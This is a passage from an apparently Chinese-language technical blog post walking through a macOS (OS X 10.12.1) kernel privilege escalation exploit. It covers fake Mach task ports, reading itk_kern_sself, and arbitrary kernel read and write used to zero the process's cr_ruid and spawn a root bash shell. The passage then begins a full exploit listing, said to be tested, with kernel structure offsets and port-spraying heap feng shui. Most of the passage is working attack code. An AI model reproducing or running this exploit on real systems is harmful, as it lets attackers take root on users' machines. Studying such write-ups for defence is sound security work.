        *(uint64_t*) (fake_task + TASK_INFO_GAP) = (kernel_process + 0x1C) - 0x10;
        pid_for_task(manipulated_port, (int32_t*)(((uint64_t)(&kern_task)) + 4));
        uint64_t itk_kern_sself = 0;
        *(uint64_t*) (fake_task + TASK_INFO_GAP) = (kern_task + ITK_KERN_SSELF_GAP_IN_TASK) - 0x10;
        pid_for_task(manipulated_port, (int32_t*)&itk_kern_sself);
        *(uint64_t*) (fake_task + TASK_INFO_GAP) = (kern_task + ITK_KERN_SSELF_GAP_IN_TASK + 4) - 0x10;
        pid_for_task(manipulated_port, (int32_t*)(((uint64_t)(&itk_kern_sself)) + 4));
        data->dump_itk_kern_sself = itk_kern_sself;
        for (int i = 0; i dump_port + (i*4)));
        }
        for (int i = 0; i dump_task + (i*4)));
        }
        return data;
    }
在上一个过程中，因为已经获得了内核进程的地址，你可以轻松地获取内核
task。接下来，我们需要在任务结构中获取端口特权信息（itk_kern_sself）以获取端口权限，任务结构如下。[osfmk/kern/task.h]
    struct task {
        /* Synchronization/destruction information */
        decl_lck_mtx_data(,lock)        /* Task's lock */
        uint32_t    ref_count;    /* Number of references to me */
        boolean_t    active;        /* Task has not been terminated */
        boolean_t    halting;    /* Task is being halted */
        /* Miscellaneous */
        vm_map_t    map;        /* Address space description */
        queue_chain_t    tasks;    /* global list of tasks */
        void        *user_data;    /* Arbitrary data settable via IPC */
    #if defined(CONFIG_SCHED_MULTIQ)
        sched_group_t sched_group;
    #endif /* defined(CONFIG_SCHED_MULTIQ) */
        /* Threads in this task */
        queue_head_t        threads;
        processor_set_t        pset_hint;
        struct affinity_space    *affinity_space;
        int            thread_count;
        uint32_t        active_thread_count;
        int            suspend_count;    /* Internal scheduling only */
        /* User-visible scheduling information */
        integer_t        user_stop_count;    /* outstanding stops */
        integer_t        legacy_stop_count;    /* outstanding legacy stops */
        integer_t        priority;            /* base priority for threads */
        integer_t        max_priority;        /* maximum priority for threads */
        integer_t        importance;        /* priority offset (BSD 'nice' value) */
        /* Task security and audit tokens */
        security_token_t sec_token;
        audit_token_t    audit_token;
        /* Statistics */
        uint64_t        total_user_time;    /* terminated threads only */
        uint64_t        total_system_time;
        /* Virtual timers */
        uint32_t        vtimers;
        /* IPC structures */
        decl_lck_mtx_data(,itk_lock_data)
        struct ipc_port *itk_self;    /* not a right, doesn't hold ref */
        struct ipc_port *itk_nself;    /* not a right, doesn't hold ref */
        struct ipc_port *itk_sself;    /* a send right */
        struct exception_action exc_actions[EXC_TYPES_COUNT];
                         /* a send right each valid element  */
        struct ipc_port *itk_host;    /* a send right */
        struct ipc_port *itk_bootstrap;    /* a send right */
        struct ipc_port *itk_seatbelt;    /* a send right */
        struct ipc_port *itk_gssd;    /* yet another send right */
        struct ipc_port *itk_debug_control; /* send right for debugmode commu
        nications */
        struct ipc_port *itk_task_access; /* and another send right */ 
        struct ipc_port *itk_resume;    /* a receive right to resume this task */
        struct ipc_port *itk_registered[TASK_PORT_REGISTER_MAX];
                        /* all send rights */
        struct ipc_space *itk_space;
    ...
这允许我们可以通过将内核的的 task 地址和端口特权地址复制到用户区域来间接地使用内核权限。也就是说，由于操作的端口指向 fake_port，并且
fake_port 具有内核端口权限，因此可以通过 task_get_special_port() 在任意端口上启用内核端口权限。
**  
**
**（7）权限提升（user - > root）**
现在，我们已经获得了内核权限，可以通过 mach_vm_read_overwrite() 和 mach_vm_write() 启用
AAR/AAW。如上一篇博客所述，更改 UCRED 结构的 CR_RUID 会改变进程的权限。proc 结构包含了 typedef struct ucred
*kauth_cred_t; 定义的 kauth_cred_tp_ucred;。
ucred 结构如下，你可以修改 cr_ruid。
    /*
     * In-kernel credential structure.
     *
     * Note that this structure should not be used outside the kernel, nor should
     * it or copies of it be exported outside.
     */
    struct ucred {
        TAILQ_ENTRY(ucred)    cr_link; /* never modify this without KAUTH_CRED_HASH_LOCK */
        u_long    cr_ref;            /* reference count */
    struct posix_cred {
        /*
         * The credential hash depends on everything from this point on
         * (see kauth_cred_get_hashkey)
         */
        uid_t    cr_uid;            /* effective user id */
        uid_t    cr_ruid;        /* real user id */
        uid_t    cr_svuid;        /* saved user id */
        short    cr_ngroups;        /* number of groups in advisory list */
        gid_t    cr_groups[NGROUPS];    /* advisory group list */
        gid_t    cr_rgid;        /* real group id */
        gid_t    cr_svgid;        /* saved group id */
        uid_t    cr_gmuid;        /* UID for group membership purposes */
        int    cr_flags;        /* flags on credential */
    } cr_posix;
        struct label    *cr_label;    /* MAC label */
        /* 
         * NOTE: If anything else (besides the flags)
         * added after the label, you must change
         * kauth_cred_find().
         */
        struct au_session cr_audit;        /* user auditing data */
    };
写入数据以获取 root 权限的代码如下：
    uint64_t cred;
    mach_vm_size_t read_bytes = 8;
    mach_vm_read_overwrite(kernel_port, (current_process + UCRED_GAP_IN_PROCESS), (size_t)8, (mach_vm_offset_t)(&cred), &read_bytes); // AAR in Kernel
    vm_offset_t root_uid = 0;
    mach_msg_type_number_t write_bytes = 8;
    mach_vm_write(kernel_port, (cred + CR_RUID_GAP_IN_UCRED), &root_uid, (mach_msg_type_number_t)write_bytes); // AAW in Kernel
    system("/bin/bash"); // Get Shell
于是当前进程就成为了具有 root 权限（cr_ruid=0）的进程。
**  
**
**漏洞利用代码（在 OS X 10.12.1 上通过测试）**
代码如下： ****
    #define PORT_COUNT 1024
    #define USE_PORT_START 384
    #define USE_PORT_HALF 512
    #define USE_PORT_END 640
    #define IO_BITS_ACTIVE 0x80000000
    #define IKOT_CLOCK 25
    #define IKOT_TASK 2
    #define lck_spin_t char
    #define TASK_GAP_IN_PROC 24
    #define CR_RUID_GAP_IN_UCRED 24
    #define TASK_GAP_IN_IPC_OBJ 104
    #define ITK_KERN_SSELF_GAP_IN_TASK 232
    #define UCRED_GAP_IN_PROCESS 232
    #define TASK_INFO_GAP 896
    #import 
    #import 
    #import 
    #import 
    #import 
    /* FROM osfmk/ipc/ipc_object.h -*/
    typedef natural_t ipc_object_bits_t;
    typedef natural_t ipc_object_refs_t;
    typedef struct _ipc_object{ 
        ipc_object_bits_t io_bits;
        ipc_object_refs_t io_references;
        lck_spin_t io_lock_data[1024];
    }ipc_object;
    /* ----------------------------*/
    typedef struct _dumpdata{
        char* dump_port;
        char* dump_task;
        uint64_t dump_itk_kern_sself;
    }dumpdata;
    struct ool_send_msg{
        mach_msg_header_t msg_head;
        mach_msg_body_t msg_body;
        mach_msg_ool_ports_descriptor_t msg_ool_ports[16];
    };
    struct ool_recv_msg{
        mach_msg_header_t msg_head;
        mach_msg_body_t msg_body;
        mach_msg_ool_ports_descriptor_t msg_ool_ports[16];
        mach_msg_trailer_t msg_trailer;
    };
    struct ool_send_msg send_msg;
    struct ool_recv_msg recv_msg;
    mach_port_t* ool_port_fengshui(){
        int current_port_num = 0;
        mach_port_t* ool_ports;
        ool_ports = calloc(PORT_COUNT, sizeof(mach_port_t));
        // Part 1. Create OOL Ports
        for(current_port_num = 0; current_port_num < PORT_COUNT; current_port_num++){ // Alloc 1024 Ports
            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ool_ports[current_port_num]); // Alloc Port
            mach_port_insert_right(mach_task_self(), ool_ports[current_port_num], ool_ports[current_port_num], MACH_MSG_TYPE_MAKE_SEND); // MACH_MSG_TYPE_MAKE_SEND Right Set.
        }
        // Part 2. Create Message Buffer (Spray)
        mach_port_t* use_ports = calloc(1024, sizeof(mach_port_t));
        for(int i = 0; i <= 1024; i++){
            use_ports[i] = MACH_PORT_DEAD;
        }
        /* Set MSG HEADER */
        send_msg.msg_head.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
        send_msg.msg_head.msgh_size = sizeof(struct ool_send_msg) - 16;
        send_msg.msg_head.msgh_remote_port = MACH_PORT_NULL;
        send_msg.msg_head.msgh_local_port = MACH_PORT_NULL; // NULL SEND
        send_msg.msg_head.msgh_reserved = 0x00;
        send_msg.msg_head.msgh_id = 0x00;
        /* SET MSG BODY */
        send_msg.msg_body.msgh_descriptor_count = 1;
        /* SET MSG OOL PORT DESCRIPTOR */
        for(int i = 0; i<=16; i++){ // appropriate ipc-send size  
            send_msg.msg_ool_ports[i].address&